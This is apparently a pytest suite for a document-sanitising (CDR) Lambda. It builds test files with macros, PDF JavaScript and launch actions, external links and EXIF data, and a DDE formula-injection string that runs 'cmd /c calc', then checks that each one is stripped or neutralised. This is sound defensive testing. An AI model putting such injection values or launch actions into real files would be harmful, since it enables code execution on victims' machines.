"""
Unit tests for CDR Lambda.
Run: cd src && pytest test_cdr.py -v

All fixtures are constructed in-memory — no external fixture files required.
"""

import io
import json
import os
import time
import zipfile
from pathlib import Path
from unittest.mock import MagicMock, patch

import openpyxl
import pikepdf
import pytest
from PIL import Image

# Set env vars before importing the module
os.environ.setdefault("SANITISED_BUCKET", "test-sanitised")
os.environ.setdefault("QUARANTINE_BUCKET", "test-quarantine")
os.environ.setdefault("RESULT_TOPIC_ARN",  "arn:aws:sns:us-east-1:123456789012:test")

import lambda_function as cdr

FIXTURES = Path(__file__).parent / "fixtures"


# ── Helpers ────────────────────────────────────────────────────────────────────

def _make_docx_with_macro() -> bytes:
    """Return a minimal .docx zip containing a vbaProject.bin."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("[Content_Types].xml",
                   '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
                   'package/2006/content-types"><Default Extension="rels" '
                   'ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
                   '</Types>')
        z.writestr("_rels/.rels", _minimal_rels())
        z.writestr("word/vbaProject.bin", b"\xd0\xcf\x11\xe0MACRO_BINARY_PAYLOAD")
        z.writestr("word/document.xml",
                   '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml'
                   '/2006/main"><w:body/></w:document>')
    return buf.getvalue()


def _make_docx_with_external_link() -> bytes:
    """Return a .docx whose .rels file references an externalLink."""
    buf = io.BytesIO()
    ns = "http://schemas.openxmlformats.org/package/2006/relationships"
    ext_type = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink"
    rels_xml = (
        f'<?xml version="1.0"?>'
        f'<Relationships xmlns="{ns}">'
        f'<Relationship Id="rId1" Type="{ext_type}" Target="externalLinks/externalLink1.xml"/>'
        f'</Relationships>'
    )
    with zipfile.ZipFile(buf, "w") as z:
        z.writestr("[Content_Types].xml", _minimal_content_types())
        z.writestr("_rels/.rels", _minimal_rels())
        z.writestr("xl/_rels/workbook.xml.rels", rels_xml)
        z.writestr("xl/workbook.xml", "<workbook/>")
    return buf.getvalue()


def _make_pdf_with_js() -> bytes:
    """Return a PDF with an /OpenAction JavaScript trigger."""
    pdf = pikepdf.Pdf.new()
    page = pdf.make_indirect(pikepdf.Dictionary(
        Type=pikepdf.Name("/Page"),
        MediaBox=pikepdf.Array([0, 0, 612, 792]),
    ))
    pdf.pages.append(pikepdf.Page(page))
    pdf.Root["/OpenAction"] = pikepdf.Dictionary(
        S=pikepdf.Name("/JavaScript"),
        JS=pikepdf.String("app.alert('pwned');"),
    )
    buf = io.BytesIO()
    pdf.save(buf)
    return buf.getvalue()


def _make_image_with_exif(fmt: str = "JPEG") -> bytes:
    """Return a tiny JPEG/PNG with valid EXIF data embedded."""
    import struct
    # Build a minimal but structurally valid EXIF block (no piexif dependency)
    # TIFF header (little-endian) + 1 IFD entry (Make tag = "Camera\0")
    tiff = b"II" + struct.pack("<H", 42) + struct.pack("<I", 8)
    ifd  = struct.pack("<H", 1)                          # 1 entry
    ifd += struct.pack("<HHI", 0x010F, 2, 7)             # tag, ASCII type, count
    ifd += struct.pack("<I", 26)                         # value offset
    ifd += struct.pack("<I", 0)                          # next IFD offset
    exif_bytes = b"Exif\x00\x00" + tiff + ifd + b"Camera\x00"

    img = Image.new("RGB", (64, 64), color=(128, 64, 32))
    buf = io.BytesIO()
    img.save(buf, format=fmt, exif=exif_bytes)
    return buf.getvalue()


def _minimal_rels() -> str:
    ns = "http://schemas.openxmlformats.org/package/2006/relationships"
    return (f'<?xml version="1.0"?>'
            f'<Relationships xmlns="{ns}"/>')


def _minimal_content_types() -> str:
    return ('<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/'
            'package/2006/content-types"></Types>')


def _make_xlsb(rows: list[list] | None = None) -> bytes:
    """Build a minimal but pyxlsb-parseable xlsb ZIP fixture.

    Encodes BIFF12 records using the same framing that BIFF12Reader expects:
      - Record ID: variable-length LE bytes, high-bit continuation flag
      - Record length: standard LEB128
    Produces workbook.bin (WORKBOOK / SHEETS / SHEET / SHEETS_END / WORKBOOK_END)
    and worksheets/sheet1.bin (WORKSHEET / DIMENSION / SHEETDATA /
    [ROW + FLOAT cells] / SHEETDATA_END / WORKSHEET_END).
    rows is a list of lists of float/None values. Defaults to [[1.0, 2.0], [3.0, 4.0]].
    """
    import struct as _struct
    from pyxlsb import biff12

    if rows is None:
        rows = [[1.0, 2.0], [3.0, 4.0]]

    def _encode_id(rec_id: int) -> bytes:
        out = b""
        for _ in range(4):
            byte = rec_id & 0xFF
            rec_id >>= 8
            out += bytes([byte])
            if rec_id == 0:
                break
        return out

    def _encode_len(length: int) -> bytes:
        # LEB128
        out = b""
        while True:
            byte = length & 0x7F
            length >>= 7
            if length:
                byte |= 0x80
            out += bytes([byte])
            if not length:
                break
        return out

    def _rec(rec_id: int, payload: bytes = b"") -> bytes:
        return _encode_id(rec_id) + _encode_len(len(payload)) + payload

    def _u32(v: int) -> bytes:
        return v.to_bytes(4, "little")

    def _biff12_string(s: str) -> bytes:
        return _u32(len(s)) + s.encode("utf-16-le")

    n_rows = len(rows)
    n_cols = max((len(r) for r in rows), default=0)

    # workbook.bin: WORKBOOK / SHEETS / SHEET / SHEETS_END / WORKBOOK_END
    sheet_rid = "rId1"
    workbook_bin = (
        _rec(biff12.WORKBOOK) +
        _rec(biff12.SHEETS) +
        _rec(biff12.SHEET,
             _u32(0) + _u32(1) + _biff12_string(sheet_rid) + _biff12_string("Sheet1")) +
        _rec(biff12.SHEETS_END) +
        _rec(biff12.WORKBOOK_END)
    )

    # worksheets/sheet1.bin:
    # WORKSHEET / DIMENSION(r1,r2,c1,c2) / SHEETDATA / rows / SHEETDATA_END / WORKSHEET_END
    # DIMENSION payload: u32 r1, u32 r2, u32 c1, u32 c2 (0-based, inclusive)
    dim_payload = _u32(0) + _u32(max(n_rows - 1, 0)) + _u32(0) + _u32(max(n_cols - 1, 0))
    sheet_rows = b""
    for r_idx, row in enumerate(rows):
        sheet_rows += _rec(biff12.ROW, _u32(r_idx))
        for c_idx, val in enumerate(row):
            if val is None:
                sheet_rows += _rec(biff12.BLANK, _u32(c_idx) + _u32(0))
            else:
                sheet_rows += _rec(biff12.FLOAT,
                                   _u32(c_idx) + _u32(0) + _struct.pack("<d", float(val)))

    sheet_bin = (
        _rec(biff12.WORKSHEET) +
        _rec(biff12.DIMENSION, dim_payload) +
        _rec(biff12.SHEETDATA) +
        sheet_rows +
        _rec(biff12.SHEETDATA_END) +
        _rec(biff12.WORKSHEET_END)
    )

    rels_ns = "http://schemas.openxmlformats.org/package/2006/relationships"
    sheet_rel_type = "http://schemas.microsoft.com/office/2006/relationships/xlBinaryIndex"
    rels_xml = (
        f'<?xml version="1.0"?>'
        f'<Relationships xmlns="{rels_ns}">'
        f'<Relationship Id="{sheet_rid}" Type="{sheet_rel_type}"'
        f' Target="worksheets/sheet1.bin"/>'
        f'</Relationships>'
    ).encode()

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as z:
        z.writestr("xl/workbook.bin", workbook_bin)
        z.writestr("xl/_rels/workbook.bin.rels", rels_xml)
        z.writestr("xl/worksheets/sheet1.bin", sheet_bin)
        z.writestr("xl/vbaProject.bin", b"\xd0\xcf\x11\xe0MACRO_BINARY")
        z.writestr("[Content_Types].xml", _minimal_content_types())
        z.writestr("_rels/.rels", _minimal_rels())
    return buf.getvalue()


class TestConstants:

    def test_ext_remap_macro_to_clean(self):
        assert cdr.EXT_REMAP["docm"] == "docx"
        assert cdr.EXT_REMAP["xlsm"] == "xlsx"
        assert cdr.EXT_REMAP["pptm"] == "pptx"
        assert cdr.EXT_REMAP["dotm"] == "dotx"
        assert cdr.EXT_REMAP["xltm"] == "xltx"
        assert cdr.EXT_REMAP["xlam"] == "xlsx"
        assert cdr.EXT_REMAP["potm"] == "potx"
        assert cdr.EXT_REMAP["ppsm"] == "ppsx"
        assert cdr.EXT_REMAP["ppam"] == "pptx"

    def test_office_exts_contains_all_ooxml(self):
        expected = {
            "docx", "docm", "dotx", "dotm",
            "xlsx", "xlsm", "xltx", "xltm", "xlam", "xlsb",
            "pptx", "pptm", "potx", "potm", "ppsx", "ppsm", "ppam",
        }
        assert expected == cdr.OFFICE_EXTS

    def test_legacy_exts(self):
        assert cdr.LEGACY_EXTS == {"doc", "xls", "ppt"}

    def test_macro_content_type_remap_keys(self):
        assert "application/vnd.ms-word.document.macroEnabled.12" in cdr.MACRO_CONTENT_TYPE_REMAP
        assert "application/vnd.ms-excel.sheet.macroEnabled.12" in cdr.MACRO_CONTENT_TYPE_REMAP
        assert "application/vnd.ms-powerpoint.presentation.macroEnabled.12" in cdr.MACRO_CONTENT_TYPE_REMAP

    def test_strip_rel_types_includes_template_injection(self):
        assert "http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" \
            in cdr.STRIP_REL_TYPES
        assert "http://schemas.openxmlformats.org/officeDocument/2006/relationships/subDocument" \
            in cdr.STRIP_REL_TYPES
        assert "http://schemas.openxmlformats.org/officeDocument/2006/relationships/frame" \
            in cdr.STRIP_REL_TYPES

    def test_strip_zip_entries_includes_new_paths(self):
        dangerous = ["customXml/", "word/attachedToolbars/", "xl/externalLinks/",
                     "xl/macrosheets/", "xl/queryTables/", "xl/connections.xml", "ppt/tags/"]
        for entry in dangerous:
            assert entry in cdr.STRIP_ZIP_ENTRIES, f"{entry} missing from STRIP_ZIP_ENTRIES"

    def test_macro_content_type_remap_includes_xlsb(self):
        assert "application/vnd.ms-excel.sheet.binary.macroEnabled.12" in cdr.MACRO_CONTENT_TYPE_REMAP

    def test_sanitised_key_remaps_extension(self):
        assert cdr._sanitised_key("uploads/report.xlsm", "xlsx") == "sanitised/uploads/report.xlsx"

    def test_sanitised_key_unchanged_extension(self):
        assert cdr._sanitised_key("uploads/report.docx", "docx") == "sanitised/uploads/report.docx"

    def test_sanitised_key_no_ext(self):
        assert cdr._sanitised_key("uploads/datafile", "datafile") == "sanitised/uploads/datafile"


# ── Office CDR tests ───────────────────────────────────────────────────────────

class TestOfficeCDR:

    def test_vba_macro_removed(self):
        data = _make_docx_with_macro()
        clean, report = cdr.cdr_office(data, "docx")

        # vbaProject.bin must not appear in the output zip
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            names = [n.lower() for n in z.namelist()]
        assert not any("vbaproject.bin" in n for n in names), \
            "vbaProject.bin still present after CDR"

        assert any("vbaProject.bin" in r for r in report["removed"]), \
            "CDR report did not record macro removal"

    def test_external_link_stripped_from_rels(self):
        data = _make_docx_with_external_link()
        clean, report = cdr.cdr_office(data, "xlsx")

        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            rels_raw = z.read("xl/_rels/workbook.xml.rels")

        assert b"externalLink" not in rels_raw, \
            "External link relationship still present in sanitised .rels"
        assert any("externallink" in r.lower() for r in report["removed"])

    def test_clean_office_file_unchanged_structure(self):
        """A macro-free docx should pass through with the same zip entries."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", _minimal_content_types())
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr("word/document.xml", "<w:document/>")

        data = buf.getvalue()
        clean, report = cdr.cdr_office(data, "docx")

        assert report["removed"] == [], "Clean file should have no removals"
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            assert "word/document.xml" in z.namelist()

    def test_custom_xml_stripped(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", _minimal_content_types())
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr("word/document.xml", "<w:document/>")
            z.writestr("customXml/item1.xml", "<root><data>payload</data></root>")
            z.writestr("customXml/_rels/item1.xml.rels", _minimal_rels())

        clean, report = cdr.cdr_office(buf.getvalue(), "docx")

        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            names = z.namelist()
        assert not any(n.startswith("customXml/") for n in names), \
            "customXml/ entries still present after CDR"
        assert any("customXml" in r for r in report["removed"])

    def test_external_links_dir_stripped(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", _minimal_content_types())
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr("xl/workbook.xml", "<workbook/>")
            z.writestr("xl/externalLinks/externalLink1.xml", "<externalLink/>")

        clean, report = cdr.cdr_office(buf.getvalue(), "xlsx")

        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            names = z.namelist()
        assert not any(n.startswith("xl/externalLinks/") for n in names)
        assert any("externalLinks" in r for r in report["removed"])


# ── PDF CDR tests ──────────────────────────────────────────────────────────────

class TestPdfCDR:

    def test_open_action_js_removed(self):
        data = _make_pdf_with_js()
        clean, report = cdr.cdr_pdf(data)

        with pikepdf.open(io.BytesIO(clean)) as pdf:
            assert "/OpenAction" not in pdf.Root, \
                "/OpenAction still present in sanitised PDF"

        assert any("/OpenAction" in r for r in report["removed"])

    def test_clean_pdf_produces_valid_output(self):
        """A PDF with no dangerous content should round-trip cleanly."""
        pdf = pikepdf.Pdf.new()
        page = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Page"),
            MediaBox=pikepdf.Array([0, 0, 612, 792]),
        ))
        pdf.pages.append(pikepdf.Page(page))
        buf = io.BytesIO()
        pdf.save(buf)

        clean, report = cdr.cdr_pdf(buf.getvalue())
        assert report["removed"] == []
        with pikepdf.open(io.BytesIO(clean)) as out:
            assert len(out.pages) == 1

    def test_page_annotation_action_removed(self):
        pdf = pikepdf.Pdf.new()
        annot = pikepdf.Dictionary(
            Type=pikepdf.Name("/Annot"),
            Subtype=pikepdf.Name("/Link"),
            A=pikepdf.Dictionary(
                S=pikepdf.Name("/Launch"),
                F=pikepdf.Dictionary(
                    Type=pikepdf.Name("/Filespec"),
                    F=pikepdf.String("malware.exe"),
                ),
            ),
        )
        page = pdf.make_indirect(pikepdf.Dictionary(
            Type=pikepdf.Name("/Page"),
            MediaBox=pikepdf.Array([0, 0, 612, 792]),
            Annots=pikepdf.Array([annot]),
        ))
        pdf.pages.append(pikepdf.Page(page))
        buf = io.BytesIO()
        pdf.save(buf)

        clean, report = cdr.cdr_pdf(buf.getvalue())
        with pikepdf.open(io.BytesIO(clean)) as out:
            annots = out.pages[0].get("/Annots", [])
            for a in annots:
                assert "/A" not in a, "Launch action still present in annotation"

        # Annotation actions are now deleted unconditionally (denylist-free); the report
        # records the /A removal rather than the specific action type.
        assert any("annot/A" in r for r in report["removed"])


# ── Image CDR tests ────────────────────────────────────────────────────────────

class TestImageCDR:

    def test_jpeg_exif_stripped(self):
        data = _make_image_with_exif("JPEG")
        clean, report = cdr.cdr_image(data, "jpg")

        img = Image.open(io.BytesIO(clean))
        exif = img.info.get("exif", b"")
        # After re-encode with no exif= kwarg, the EXIF chunk should be absent
        assert exif == b"" or exif is None, "EXIF not stripped from sanitised JPEG"
        assert "EXIF" in report["removed"]

    def test_png_roundtrips_as_valid_image(self):
        img = Image.new("RGBA", (32, 32), (255, 0, 0, 128))
        buf = io.BytesIO()
        img.save(buf, format="PNG")

        clean, report = cdr.cdr_image(buf.getvalue(), "png")
        result = Image.open(io.BytesIO(clean))
        assert result.size == (32, 32)
        assert result.mode == "RGBA"

    def test_gif_stays_gif(self):
        """GIF is re-encoded as GIF — format is preserved for downstream consumers."""
        img = Image.new("P", (16, 16))
        buf = io.BytesIO()
        img.save(buf, format="GIF")

        clean, report = cdr.cdr_image(buf.getvalue(), "gif")
        result = Image.open(io.BytesIO(clean))
        assert result.format == "GIF"

    def test_gif_comment_stripped(self):
        """GIF comment extension blocks are suppressed on re-encode."""
        img = Image.new("RGB", (16, 16), color="red")
        buf = io.BytesIO()
        img.save(buf, format="GIF", comment=b"malicious comment payload")

        clean, report = cdr.cdr_image(buf.getvalue(), "gif")
        result = Image.open(io.BytesIO(clean))
        assert not result.info.get("comment"), "GIF comment extension not stripped"
        assert "comment" in report["removed"]

    def test_gif_content_type_is_gif(self):
        """GIF output stays GIF; _EXT_CONTENT_TYPE must map gif → image/gif."""
        assert cdr._EXT_CONTENT_TYPE.get("gif") == "image/gif"
        assert cdr._content_type_for_ext("gif", "image/gif") == "image/gif"

    def test_tiff_multiframe_all_frames_preserved(self):
        """Multi-frame TIFF is re-encoded frame-by-frame — all frames survive CDR."""
        frames = [Image.new("RGB", (8, 8), color=(i * 60, 0, 0)) for i in range(3)]
        buf = io.BytesIO()
        frames[0].save(buf, format="TIFF", save_all=True, append_images=frames[1:])

        clean, report = cdr.cdr_image(buf.getvalue(), "tiff")
        result = Image.open(io.BytesIO(clean))
        assert result.n_frames == 3, f"Expected 3 frames, got {result.n_frames}"

    def test_tiff_multiframe_metadata_stripped(self):
        """Multi-frame TIFF re-encode strips EXIF from all frames."""
        import struct
        tiff_hdr = b"II" + struct.pack("<H", 42) + struct.pack("<I", 8)
        ifd = struct.pack("<H", 1) + struct.pack("<HHI", 0x010F, 2, 7) \
            + struct.pack("<I", 26) + struct.pack("<I", 0)
        exif_bytes = b"Exif\x00\x00" + tiff_hdr + ifd + b"Camera\x00"

        frames = [Image.new("RGB", (8, 8), color=(i * 60, 0, 0)) for i in range(2)]
        buf = io.BytesIO()
        frames[0].save(buf, format="TIFF", save_all=True,
                       append_images=frames[1:], exif=exif_bytes)

        clean, report = cdr.cdr_image(buf.getvalue(), "tiff")
        result = Image.open(io.BytesIO(clean))
        assert not result.info.get("exif"), "EXIF not stripped from multi-frame TIFF"
        assert result.n_frames == 2

    def test_webp_content_type_correct(self):
        """webp output stays webp — confirm the content type map is consistent with fmt_map."""
        assert cdr._EXT_CONTENT_TYPE.get("webp") == "image/webp"
        assert cdr._content_type_for_ext("webp", "image/webp") == "image/webp"


class TestContentTypesSanitisation:

    def _make_macro_content_types(self) -> bytes:
        return (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
            '<Default Extension="bin" ContentType="application/vnd.ms-office.vbaProject"/>'
            '<Override PartName="/xl/workbook.xml"'
            ' ContentType="application/vnd.ms-excel.sheet.macroEnabled.12"/>'
            '</Types>'
        ).encode()

    def test_macro_content_type_replaced(self):
        data = self._make_macro_content_types()
        clean, removed = cdr._sanitise_content_types(data)

        assert b"macroEnabled" not in clean, "macro-enabled content type still present"
        assert b"spreadsheetml.sheet" in clean, "clean content type not written"
        assert len(removed) > 0

    def test_vba_bin_default_removed(self):
        data = self._make_macro_content_types()
        clean, removed = cdr._sanitise_content_types(data)

        assert b"vbaProject" not in clean, "vbaProject reference still in content types"

    def test_clean_content_types_unchanged(self):
        clean_data = (
            '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            '<Default Extension="xml" ContentType="application/xml"/>'
            '<Override PartName="/word/document.xml"'
            ' ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document"/>'
            '</Types>'
        ).encode()
        result, removed = cdr._sanitise_content_types(clean_data)
        assert removed == []


class TestContentTypeRealOfficeTypes:
    """Validate MACRO_CONTENT_TYPE_REMAP against the actual content type strings
    that Microsoft Office writes into [Content_Types].xml for every macro-enabled format.
    Uses both Override (part-level *.main+xml) and Default (.12 container) entry forms."""

    def _ct_xml_override(self, content_type: str) -> bytes:
        return (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            f'<Override PartName="/word/document.xml" ContentType="{content_type}"/>'
            '</Types>'
        ).encode()

    def _ct_xml_default(self, content_type: str) -> bytes:
        return (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
            f'<Default Extension="ext" ContentType="{content_type}"/>'
            '</Types>'
        ).encode()

    def _assert_remapped(self, input_ct: str, expected_ct: str, entry_type: str):
        xml = self._ct_xml_override(input_ct) if entry_type == "override" else self._ct_xml_default(input_ct)
        clean, removed = cdr._sanitise_content_types(xml)
        clean_str = clean.decode()
        assert input_ct not in clean_str, f"{input_ct!r} was NOT replaced"
        assert expected_ct in clean_str, f"expected {expected_ct!r} not found after remap"

    # ── Part-level Override types (*.main+xml) — what real Office files write ──

    def test_docm_part_level_type_remapped(self):
        self._assert_remapped(
            "application/vnd.ms-word.document.macroEnabled.main+xml",
            "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml",
            "override")

    def test_dotm_part_level_type_remapped(self):
        self._assert_remapped(
            "application/vnd.ms-word.template.macroEnabledTemplate.main+xml",
            "application/vnd.openxmlformats-officedocument.wordprocessingml.template.main+xml",
            "override")

    def test_xlsm_part_level_type_remapped(self):
        self._assert_remapped(
            "application/vnd.ms-excel.sheet.macroEnabled.main+xml",
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml",
            "override")

    def test_xltm_part_level_type_remapped(self):
        self._assert_remapped(
            "application/vnd.ms-excel.template.macroEnabled.main+xml",
            "application/vnd.openxmlformats-officedocument.spreadsheetml.template.main+xml",
            "override")

    def test_pptm_part_level_type_remapped(self):
        self._assert_remapped(
            "application/vnd.ms-powerpoint.presentation.macroEnabled.main+xml",
            "application/vnd.openxmlformats-officedocument.presentationml.presentation.main+xml",
            "override")

    def test_potm_part_level_type_remapped(self):
        self._assert_remapped(
            "application/vnd.ms-powerpoint.template.macroEnabled.main+xml",
            "application/vnd.openxmlformats-officedocument.presentationml.template.main+xml",
            "override")

    def test_ppsm_part_level_type_remapped(self):
        self._assert_remapped(
            "application/vnd.ms-powerpoint.slideshow.macroEnabled.main+xml",
            "application/vnd.openxmlformats-officedocument.presentationml.slideshow.main+xml",
            "override")

    # ── Container-level Default types (.12) — older Office files and add-ins ──

    def test_docm_container_type_remapped_as_default(self):
        self._assert_remapped(
            "application/vnd.ms-word.document.macroEnabled.12",
            "application/vnd.openxmlformats-officedocument.wordprocessingml.document",
            "default")

    def test_dotm_container_type_remapped_as_default(self):
        self._assert_remapped(
            "application/vnd.ms-word.template.macroEnabled.12",
            "application/vnd.openxmlformats-officedocument.wordprocessingml.template",
            "default")

    def test_xlsm_container_type_remapped_as_default(self):
        self._assert_remapped(
            "application/vnd.ms-excel.sheet.macroEnabled.12",
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            "default")

    def test_xlam_container_type_remapped_as_default(self):
        self._assert_remapped(
            "application/vnd.ms-excel.addin.macroEnabled.12",
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            "default")

    def test_xlsb_container_type_remapped_as_default(self):
        self._assert_remapped(
            "application/vnd.ms-excel.sheet.binary.macroEnabled.12",
            "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
            "default")

    def test_pptm_container_type_remapped_as_default(self):
        self._assert_remapped(
            "application/vnd.ms-powerpoint.presentation.macroEnabled.12",
            "application/vnd.openxmlformats-officedocument.presentationml.presentation",
            "default")

    def test_ppam_container_type_remapped_as_default(self):
        self._assert_remapped(
            "application/vnd.ms-powerpoint.addin.macroEnabled.12",
            "application/vnd.openxmlformats-officedocument.presentationml.presentation",
            "default")


class TestXlsbCDR:
    """xlsb files with sheet binaries are converted to clean xlsx via cdr_xlsb().
    Cell values are preserved; all formulas, DDE, VBA, and active content are stripped."""

    def test_xlsb_with_sheet_produces_xlsx(self):
        """cdr_xlsb() returns valid xlsx bytes."""
        clean, report = cdr.cdr_xlsb(_make_xlsb())
        wb = openpyxl.load_workbook(io.BytesIO(clean))
        assert len(wb.sheetnames) == 1

    def test_xlsb_cell_values_preserved(self):
        """Cell values survive the xlsb→xlsx conversion."""
        clean, report = cdr.cdr_xlsb(_make_xlsb(rows=[[10.0, 20.0], [30.0, 40.0]]))
        wb = openpyxl.load_workbook(io.BytesIO(clean))
        ws = wb.active
        assert ws.cell(1, 1).value == pytest.approx(10.0)
        assert ws.cell(1, 2).value == pytest.approx(20.0)
        assert ws.cell(2, 1).value == pytest.approx(30.0)
        assert ws.cell(2, 2).value == pytest.approx(40.0)

    def test_xlsb_report_records_conversion(self):
        """Report indicates BIFF12 binary content was converted."""
        _, report = cdr.cdr_xlsb(_make_xlsb())
        assert report["format"] == "xlsb"
        assert report["converted_to"] == "xlsx"
        assert report["cdr_mode"] == "full"
        assert len(report["removed"]) > 0

    def test_cdr_office_dispatches_to_cdr_xlsb_on_sheet_bin(self):
        """cdr_office() calls cdr_xlsb() when a sheet .bin is encountered — no ValueError."""
        clean, report = cdr.cdr_office(_make_xlsb(), "xlsb")
        # Must be valid xlsx (openpyxl can open it)
        wb = openpyxl.load_workbook(io.BytesIO(clean))
        assert len(wb.sheetnames) >= 1
        assert report["converted_to"] == "xlsx"

    def test_xlsb_vba_only_still_handled_by_zip_path(self):
        """xlsb with VBA but no sheet .bin still goes through normal ZIP CDR."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", _minimal_content_types())
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr("xl/vbaProject.bin", b"\xd0\xcf\x11\xe0MACRO_BINARY")
        clean, report = cdr.cdr_office(buf.getvalue(), "xlsb")
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            names = [n.lower() for n in z.namelist()]
        assert not any("vbaproject.bin" in n for n in names)
        assert report.get("converted_to") is None  # went through ZIP path, not cdr_xlsb

    def test_xlsb_metadata_bin_not_diverted_to_conversion(self):
        """An xlsb with non-worksheet .bin parts (e.g. xl/workbook.bin) but no
        xl/worksheets/sheet*.bin must NOT be handed to cdr_xlsb() — only worksheet
        binaries trigger conversion. It goes through the normal ZIP CDR path."""
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("[Content_Types].xml", _minimal_content_types())
            z.writestr("_rels/.rels", _minimal_rels())
            z.writestr("xl/workbook.bin", b"\x00\x01metadata-not-a-worksheet")
            z.writestr("xl/vbaProject.bin", b"\xd0\xcf\x11\xe0MACRO_BINARY")
        clean, report = cdr.cdr_office(buf.getvalue(), "xlsb")
        assert report.get("converted_to") is None  # ZIP path, not cdr_xlsb
        with zipfile.ZipFile(io.BytesIO(clean)) as z:
            names = [n.lower() for n in z.namelist()]
        assert not any("vbaproject.bin" in n for n in names)  # VBA still stripped

    def test_xlsb_formula_string_cached_value_forced_to_plain_text(self):
        """A FORMULA_STRING cached result starting with '=' must NOT become a live
        formula in the output xlsx. cdr_xlsb() prefixes it with an apostrophe so
        openpyxl serialises it as a plain string, not a <f> element."""
        # Build an xlsb with a string cell value that starts with '=' (simulating a
        # crafted FORMULA_STRING cached result like '=DDE("cmd","/c calc")').
        # We patch pyxlsb so we can inject the problematic cached value directly,
        # without needing to encode a real FORMULA_STRING BIFF12 record.
        from unittest.mock import MagicMock, patch

        evil_value = '=DDE("cmd","/c calc")'

        # Create a fake cell namedtuple that matches pyxlsb's Cell structure
        import collections
        FakeCell = collections.namedtuple("FakeCell", ["r", "c", "v"])
        fake_row = [FakeCell(r=0, c=0, v=evil_value)]

        fake_ws = MagicMock()
        fake_ws.__enter__ = lambda s: s
        fake_ws.__exit__ = MagicMock(return_value=False)
        fake_ws.rows.return_value = [fake_row]

        fake_wb = MagicMock()
        fake_wb.__enter__ = lambda s: s
        fake_wb.__exit__ = MagicMock(return_value=False)
        fake_wb.sheets = ["Sheet1"]
        fake_wb.get_sheet.return_value = fake_ws

        with patch("pyxlsb.open_workbook", return_value=fake_wb):
            clean, _ = cdr.cdr_xlsb(_make_xlsb())

        wb = openpyxl.load_workbook(io.BytesIO(clean))
        ws = wb.active
        cell = ws.cell(1, 1)
        # The cell must NOT be a formula type and must NOT contain the raw DDE string
        assert cell.data_type != "f", "cell was serialised as a formula — formula injection not blocked"
        assert cell.value != evil_value, "raw evil_value survived unsanitised"
        # The apostrophe prefix makes the value a plain text string in Excel
        assert cell.value == "'" + evil_value


class TestZipValidation:

    def _make_zip(self, entries: dict,
                  compress_method: int = zipfile.ZIP_DEFLATED) -> bytes:
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", compression=compress_method) as z:
            for name, data in entries.items():
                z.writestr(name, data)
        return buf.getvalue()

    def test_valid_zip_returns_true_no_anomalies(self):
        data = self._make_zip({
            "[Content_Types].xml": b"<Types/>",
            "word/document.xml": b"<doc/>",
        })
        valid, anomalies = cdr._validate_zip_structure(data)
        assert valid is True
        assert anomalies == []

    def test_zip_without_content_types_rejected(self):
        """A valid ZIP that is not an OOXML package (no [Content_Types].xml) must be
        hard-rejected, not CDR'd and labelled sanitised."""
        data = self._make_zip({"random/file.txt": b"x", "another.bin": b"y"})
        valid, anomalies = cdr._validate_zip_structure(data)
        assert valid is False
        assert "Content_Types" in anomalies[0]

    def test_wrong_magic_bytes_returns_false(self):
        data = b"Not a ZIP file at all"
        valid, anomalies = cdr._validate_zip_structure(data)
        assert valid is False

    def test_too_small_returns_false(self):
        valid, anomalies = cdr._validate_zip_structure(b"\x50\x4b")
        assert valid is False

    def test_duplicate_entry_names_hard_rejected(self):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as z:
            z.writestr("word/document.xml", b"<doc/>")
            z.writestr("word/document.xml", b"<evil/>")
        data = buf.getvalue()
        valid, anomalies = cdr._validate_zip_structure(data)
        assert valid is False  # hard reject — reader disambiguation is app-defined
        assert any("duplicate" in a.lower() for a in anomalies)

    def test_non_zip_magic_detected(self):
        data = b"%PDF-1.4 fake content" + b"\x00" * 100
        valid, anomalies = cdr._validate_zip_structure(data)
        assert valid is False


